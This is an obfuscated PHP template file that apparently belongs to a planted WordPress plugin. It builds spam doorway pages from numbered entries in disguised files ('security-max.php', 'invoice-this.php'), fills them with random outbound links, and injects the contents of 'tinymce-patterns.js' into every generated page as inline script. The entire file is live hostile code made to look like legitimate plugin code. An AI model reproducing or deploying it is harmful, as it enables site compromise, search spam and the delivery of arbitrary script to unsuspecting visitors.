<?php
$fdFJ8zA = intval(get_query_var('pcesetg'));

if ($fdFJ8zA < 1 || $fdFJ8zA > 4207) return;
$rjPEjrg = file(plugin_dir_path(__FILE__).'security-max.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$fBS0E = explode(';', $rjPEjrg[$fdFJ8zA]);
if (count($fBS0E) < 2) return;
$vK7vCxE3 = $fBS0E[0];
$e7LP7b  = $fBS0E[1];
$eJEgod97 = $fBS0E[2];
$uQkEbY  = $fBS0E[3];
$w64RsyLHA5 = $fBS0E[4];
set_query_var('vhlhhi', $vK7vCxE3);

$sJgpM39 = '';
$xTmKyVlNF = plugin_dir_path(__FILE__).'invoice-this.php';
if (is_file($xTmKyVlNF)) {
	$nmMbNBAL = file($xTmKyVlNF, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($nmMbNBAL);
	shuffle($nmMbNBAL);
	$c1fM00ZMN = mt_rand(2, 5);
	if (count($nmMbNBAL) > $c1fM00ZMN) {
		for ($dhcpVz = 0; $dhcpVz < $c1fM00ZMN; $dhcpVz++) {
			$nDKh2p = array_shift($nmMbNBAL);
			$sJgpM39 .= '<p><a href="'.$nDKh2p.'">'.$nDKh2p.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $vK7vCxE3; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $e7LP7b . "</p>\n";
				if (strlen($uQkEbY) > 0) echo "<p>" . $uQkEbY . "</p>\n";
				if (strlen($eJEgod97) > 0) echo "<p>" . $eJEgod97 . "</p>\n";
				if (strlen($w64RsyLHA5) > 0) echo '<p><a href="#"><img src="'.$w64RsyLHA5.'"></a>' . "</p>\n";
				echo $sJgpM39;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$fFjHwS = plugin_dir_path(__FILE__) . 'tinymce-patterns.js';
if (is_file($fFjHwS)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($fFjHwS);
	echo '</script>';
}
get_footer();
?>
